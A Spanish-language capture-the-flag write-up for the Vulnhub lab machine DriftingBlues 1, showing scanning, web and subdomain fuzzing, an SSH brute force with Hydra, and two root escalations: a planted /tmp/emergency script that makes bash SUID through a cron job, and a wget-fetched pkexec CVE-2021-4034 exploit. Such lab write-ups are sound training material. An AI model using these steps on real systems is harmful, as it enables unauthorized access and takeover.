---
title: DriftingBlues 1 Writeup - Vulnhub
date: 2025-01-22
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues, Hydra, Brainfuck]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

¡Saludos!

Vamos a estar compleando la serie [**DriftingBlues**](https://www.vulnhub.com/series/driftingblues,424/) de **Vulnhub**, la cual consta de 8 capítulos.

En este writeup, nos adentraremos en la primer máquina [**DriftingBlues1**](https://www.vulnhub.com/entry/driftingblues-1,625/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **enumeración de subdominios**, **fuzzing web**, **SSH** para conectarnos a la máquina víctima y **dos formas** para elevar nuestros privilegios como usuario **root**, obteniendo así las flags del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.28     00:0c:29:30:1b:a6       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.403 seconds (106.53 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.28
PING 10.11.12.28 (10.11.12.28) 56(84) bytes of data.
64 bytes from 10.11.12.28: icmp_seq=1 ttl=64 time=0.517 ms

--- 10.11.12.28 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.517/0.517/0.517/0.000 ms
```

Dado que el `TTL` es 64, podemos inferir que la máquina objetivo este ejecutando un SO Linux.

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.28 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 18:04 -03
Nmap scan report for 10.11.12.28
Host is up (0.0041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:30:1B:A6 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.72 seconds
```

Parámetros:

- `-p-`: indica que se escaneen todos los puertos posibles (65535) del objetivo.
- `--open`: indica que se muestren solo los puertos abiertos, ignorando los cerrados o filtrados.
- `-n`: indica que no se haga resolución DNS.
- `-sS`: indica que se use el tipo de escaneo TCP SYN.
- `-Pn`: indica que se debe omitir el descubrimiento de hosts y asumir que todos los objetivos están vivos.
- `--min-rate 5000`: indica que se envíen al menos 5000 paquetes por segundo.
- `10.11.12.28`: indica la dirección IP del objetivo a escanear.
- `-oG nmap_ports`: indica que se guarde el resultado del escaneo en formato grepeable en el archivo nmap_ports.

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p22,80 -sCV 10.11.12.28 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 18:05 -03
Nmap scan report for 10.11.12.28
Host is up (0.00044s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ca:e6:d1:1f:27:f2:62:98:ef:bf:e4:38:b5:f1:67:77 (RSA)
|   256 a8:58:99:99:f6:81:c4:c2:b4:da:44:da:9b:f3:b8:9b (ECDSA)
|_  256 39:5b:55:2a:79:ed:c3:bf:f5:16:fd:bd:61:29:2a:b7 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Drifting Blues Tech
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 00:0C:29:30:1B:A6 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.23 seconds
```

Parámetros:

- `-p 22,80`: indica que se escaneen solo los puertos especificados del objetivo.
- `-sV`: indica que se sondeen los puertos abiertos para determinar la información de servicio y versión.
- `-sC`: indica que se ejecute el script por defecto de Nmap, que realiza varias pruebas comunes como detección de vulnerabilidades o enumeración de recursos.
- Los parámetros `-sV` y `-sC` se pueden compactar en `-sCV`

El informe de `Nmap` nos revela:
- Puerto `22` se encuentra en ejecución un servidor `OpenSSH 7.2p1`
- Puerto `80` se identifica un servidor `Apache 2.4.18`.

### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.28/
http://10.11.12.28/ [200 OK] Apache[2.4.18], Bootstrap, Country[RESERVED][ZZ], Email[eric@driftingblues.box,sheryl@driftingblues.box], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.11.12.28], JQuery, Script, Title[Drifting Blues Tech], X-UA-Compatible[ie=edge]
```

Verificamos la web y su código.

![web](/assets/img/commons/vulnhub/DriftingBlues1/web.png){: .center-image }

Verificando el código de la web, nos encontramos con una cadena en base64, la cual nos revela un path.

```bash
❯ echo L25vdGVmb3JraW5nZmlzaC50eHQ= | base64 -d; echo
/noteforkingfish.txt
```

Verificamos dicha web y nos encontramos con una cadena la cual está escrita en el lenguaje de programación `Brainfuck`.

![Brainfuck](/assets/img/commons/vulnhub/DriftingBlues1/Brainfuck.png){: .center-image }

Utilizamos el siguiente recurso web [Cachesleuth](https://www.cachesleuth.com/bfook.html) para desencriptar el código.

![cacheleuth](/assets/img/commons/vulnhub/DriftingBlues1/cacheleuth.png){: .center-image }

Por el contenido del mensaje, nos damos cuenta que apunta a que debemos modificar algo en el archivo `hosts`, con lo cual podemos estar frente a un dominio o subdominio.

Procedemos a ejecutar un script de nmap `http-enum` para realizar un fuzzing rápido de directorios.

```shell
❯ nmap -p80 --script http-enum 10.11.12.28 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-25 18:45 -03
Nmap scan report for 10.11.12.28
Host is up (0.00036s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|   /img/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.18 (ubuntu)'
MAC Address: 00:0C:29:30:1B:A6 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
```
Dicho fuzzing no nos muestra mucha información, vamos a utilizar `gobuster` para tratar de encontrar más directorios o archivos ocultos.

```bash
❯ gobuster dir -u http://10.11.12.28/  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 10 -x php,html,php.bak,bak,sh,txt,.htpasswd,.htaccess,.key,key,.txt,zip,rar,tar,7z,gzip1,jpg,gif,jpeg,sql,.sql,pcap,.pcap -o go.log -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.28/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              jpeg,htaccess,rar,txt,htpasswd,tar,sql,pcap,html,bak,gzip1,sh,key,zip,7z,jpg,gif,php,php.bak
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.28/.htpasswd            (Status: 403) [Size: 276]
http://10.11.12.28/.htaccess            (Status: 403) [Size: 276]
http://10.11.12.28/.html                (Status: 403) [Size: 276]
http://10.11.12.28/index.html           (Status: 200) [Size: 7710]
http://10.11.12.28/img                  (Status: 301) [Size: 308] [--> http://10.11.12.28/img/]
http://10.11.12.28/css                  (Status: 301) [Size: 308] [--> http://10.11.12.28/css/]
http://10.11.12.28/js                   (Status: 301) [Size: 307] [--> http://10.11.12.28/js/]
http://10.11.12.28/secret.html          (Status: 200) [Size: 25]
http://10.11.12.28/.htaccess            (Status: 403) [Size: 276]
http://10.11.12.28/.htpasswd            (Status: 403) [Size: 276]
http://10.11.12.28/.html                (Status: 403) [Size: 276]
```

Encontramos el archivo `secret.html` pero no tiene información relevante, sólo que indaguemos más.

![secret](/assets/img/commons/vulnhub/DriftingBlues1/secret.png){: .normal }

Retornando a la web principal, observamos 2 mails de usuarios, con el dominio `driftingblues.box`.

![users](/assets/img/commons/vulnhub/DriftingBlues1/users.png){: .center-image }

El resultado del desencriptado del código *Brainfuck* decía que deberíamos saber usar el archivo hosts, con lo cual agregamos el dominio `driftingblues.box` a nuestro archivo hosts. 

```shell
echo '10.11.12.28 driftingblues.box' >> /etc/hosts
```

Procedemos a realizar fuzzing de directorios sobre el dominio, por si hay virtual hosting, pero esta vez con la herramienta `dirb`.

```bash
❯ dirb http://driftingblues.box/ -o dirb.log

-----------------
DIRB v2.22
By The Dark Raver
-----------------

OUTPUT_FILE: dirb.log
START_TIME: Sat Jan 25 19:01:23 2025
URL_BASE: http://driftingblues.box/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://driftingblues.box/ ----
==> DIRECTORY: http://driftingblues.box/css/
==> DIRECTORY: http://driftingblues.box/img/
+ http://driftingblues.box/index.html (CODE:200|SIZE:7710)
==> DIRECTORY: http://driftingblues.box/js/
+ http://driftingblues.box/server-status (CODE:403|SIZE:282)

---- Entering directory: http://driftingblues.box/css/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://driftingblues.box/img/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

---- Entering directory: http://driftingblues.box/js/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Sat Jan 25 19:01:26 2025
DOWNLOADED: 4612 - FOUND: 2
```

Al encontrar nuevamente lo mismo, sospecho que debe haber un subdominio, hacemos fuzzing de subdominios con `wfuzz`.

```bash
❯ wfuzz -c --hc=400,404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u  http://driftingblues.box -H "Host: FUZZ.driftingblues.box" --hh 7710
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://driftingblues.box/
Total requests: 87664

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000613:   200        5 L      4 W        24 Ch       "test"
```

Encontramos el subdomino *test*. Lo agregamos a nuestro archivo *hosts* y validamos la web.

```shell
echo '10.11.12.28 test.driftingblues.box' >> /etc/hosts
```

![test](/assets/img/commons/vulnhub/DriftingBlues1/test.png){: .normal }

Ya que no tenemos información relevante, volvemos a realizar fuzzing de directorios o archivos.

```bash
❯ gobuster dir -u http://test.driftingblues.box/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 10 -x php,html,php.bak,bak,sh,txt,.htpasswd,.htaccess,.key,key,.txt,zip,rar,tar,7z,gzip1,jpg,gif,jpeg,sql,.sql,pcap,.pcap -o go_test.driftingblues.box.log -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://test.driftingblues.box/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              gif,sql,html,php.bak,rar,7z,gzip1,jpg,sh,jpeg,pcap,php,bak,htpasswd,htaccess,tar,txt,key,zip
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://test.driftingblues.box/.html                (Status: 403) [Size: 287]
http://test.driftingblues.box/.htaccess            (Status: 403) [Size: 287]
http://test.driftingblues.box/.htpasswd            (Status: 403) [Size: 287]
http://test.driftingblues.box/index.html           (Status: 200) [Size: 24]
http://test.driftingblues.box/robots.txt           (Status: 200) [Size: 125]
```

Encontramos un archivo robots.txt, revisamos las entradas que tiene y nos brinda la ruta `/ssh_cred.txt`.

![robots](/assets/img/commons/vulnhub/DriftingBlues1/robots.png){: .normal }

![ssh_cred](/assets/img/commons/vulnhub/DriftingBlues1/ssh_cred.png){: .normal }


Ya tenemos parte de la contraseña de usuario, resta agregarle un número al final y luego ejecutar `hydra` para realizar fuerza bruta.


## Explotación

---

Creamos un diccionario.

```bash
❯ for i in {0..9}; do echo "1mw4ckyyucky$i" >> dic.txt; done
❯ cat dic.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: dic.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1mw4ckyyucky0
   2   │ 1mw4ckyyucky1
   3   │ 1mw4ckyyucky2
   4   │ 1mw4ckyyucky3
   5   │ 1mw4ckyyucky4
   6   │ 1mw4ckyyucky5
   7   │ 1mw4ckyyucky6
   8   │ 1mw4ckyyucky7
   9   │ 1mw4ckyyucky8
  10   │ 1mw4ckyyucky9
```

Ejecutamos *Hydra* sobre los usuarios sheryl y eric utilizando el diccionario.

```bash
❯ hydra -L users.txt -P dic.txt driftingblues.box ssh -t 10
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-26 12:41:05
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 10 tasks per 1 server, overall 10 tasks, 20 login tries (l:2/p:10), ~2 tries per task
[DATA] attacking ssh://driftingblues.box:22/
[22][ssh] host: driftingblues.box   login: eric   password: 1mw4ckyyucky6
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-26 12:41:09
```

Tenemos la password de eric, nos conectamos por SSH.

```bash
❯ ssh eric@driftingblues.box
The authenticity of host 'driftingblues.box (10.11.12.28)' can't be established.
ED25519 key fingerprint is SHA256:TPptpDbsZJVFnku0lz8RPzAVCG2F92ZjByju6dhXywQ.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'driftingblues.box' (ED25519) to the list of known hosts.
eric@driftingblues.box's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-123-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

eric@driftingblues:~$
```

Listamos la Flag 1.

```bash
eric@driftingblues:~$ cat user.txt
flag 1/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░░░░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░░▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█
```


## Escalación de privilegios

---

> Podemos escalar privilegios de 2 formas.
{: .prompt-tip }


### Primera

Listamos los procesos actuales del sistema con `ps -faux` y notamos que uno de ellos es generado por una tarea *CRON* por el usuario root.

```bash
root       745  0.0  0.3  37480  3344 ?        Ss   15:08   0:00 /usr/sbin/cron -f
root     22305  0.0  0.2  60784  3000 ?        S    16:19   0:00  \_ /usr/sbin/CRON -f
root     22306  0.0  0.0   4504   748 ?        Ss   16:19   0:00      \_ /bin/sh -c /bin/sh /var/backups/backup.sh
root     22307  0.0  0.0   4504   696 ?        S    16:19   0:00          \_ /bin/sh /var/backups/backup.sh
root     22310  0.0  0.3  50384  3944 ?        S    16:19   0:00              \_ sudo /tmp/emergency
```

Verificamos los permisos del archivo backup.sh pero no podemos escribir.

```bash
eric@driftingblues:/tmp$ ls -l /var/backups/backup.sh
-r--r--r-x 1 root root 123 Ara 11  2020 /var/backups/backup.sh
```

Código del script

```bash
eric@driftingblues:/tmp$ cat /var/backups/backup.sh
#!/bin/bash

/usr/bin/zip -r -0 /tmp/backup.zip /var/www/
/bin/chmod

#having a backdoor would be nice
sudo /tmp/emergency
```

Validando el directorio `/tmp` no existe el archivo emergency, con lo cual, tenemos una via potencial para elevar nuestro privilegio.

Creamos el archivo emergency, le asignamos un código para hacer la bash *SUID* y le damos permiso `+x` para que se ejecute.

```bash
eric@driftingblues:/tmp$ cat emergency
chmod u+s /bin/bash
eric@driftingblues:/tmp$ chmod +x emergency
```

Esperamos 1 minuto que corra nuevamente la tarea CRON y verificamos que tenemos permiso *SUID* sobre la bash.

```bash
eric@driftingblues:/tmp$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Tem 12  2019 /bin/bash

eric@driftingblues:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1037528 Tem 12  2019 /bin/bash
```

Ejecutamos la bash con privilegios y accedemos como root, listando la Flag 2.

```bash
eric@driftingblues:/tmp$ bash -p
bash-4.3# id
uid=1001(eric) gid=1001(eric) euid=0(root) groups=1001(eric)
bash-4.3# cd /root
bash-4.3# ls
root.txt
bash-4.3# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

### Segunda forma de elevar nuestro privilegio.

Listamos los binarios `SUID` del sistema.

```bash
eric@driftingblues:~$ find / -perm -4000 2>/dev/null
/bin/bash
/bin/su
/bin/ping
/bin/fusermount
/bin/mount
/bin/ping6
/bin/umount
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/snapd/snap-confine
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/oxide-qt/chrome-sandbox
/usr/lib/xorg/Xorg.wrap
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/sbin/pppd
/usr/bin/pkexec
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
```

El binario `pkexec` tiene una vulnerabilidad conocida, con el que podemos ejecutar un script en python y obtener acceso root.

[Repositorio del archivo python](https://github.com/Almorabea/pkexec-exploit)

Lo descargamos y lo compartimos con la máquina víctima, le damos permiso de ejecución, lo ejecutamos y tenemos la consola como root.

```bash
eric@driftingblues:/tmp$ wget http://10.11.12.10/CVE-2021-4034.py
--2025-01-26 16:43:29--  http://10.11.12.10/CVE-2021-4034.py
Connecting to 10.11.12.10:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3068 (3,0K) [text/x-python]
Saving to: ‘CVE-2021-4034.py.1’

CVE-2021-4034.py.1                      100%[==============================================================================>]   3,00K  --.-KB/s    in 0s

2025-01-26 16:43:29 (83,7 MB/s) - ‘CVE-2021-4034.py.1’ saved [3068/3068]

eric@driftingblues:/tmp$ chmod +x CVE-2021-4034.py
eric@driftingblues:/tmp$ ./CVE-2021-4034.py
Do you want to choose a custom payload? y/n (n use default payload)
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7fbb76d0e4e8 at 0x7fbb76ba3748>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1001(eric) groups=1001(eric)
# cd /root
# ls
root.txt
# cat root.txt
flag 2/2
░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
thank you for playing
```

Hope it helps!
